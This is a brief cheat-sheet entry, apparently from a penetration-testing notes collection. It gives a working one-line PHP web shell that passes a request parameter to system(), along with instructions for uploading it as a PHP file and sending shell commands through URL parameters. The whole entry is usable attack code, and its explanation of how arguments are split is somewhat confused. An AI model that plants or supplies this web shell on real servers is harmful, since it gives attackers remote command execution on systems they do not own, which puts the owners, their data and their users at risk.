## PHP Web Shell

Most common PHP web shell:

```php
<?php system($_REQUEST[0]); ?>
```

To be stored in a file.php loaded via browser.
Arguments can be passed via URL get arguments. Each argument represent one word in the command line, "spaces" are inserted automatically. 
The command goes to param 0 separated via spaces (URL-encoded, Firefox encodes some chars automatically, other chars may need escaping via %-codes)
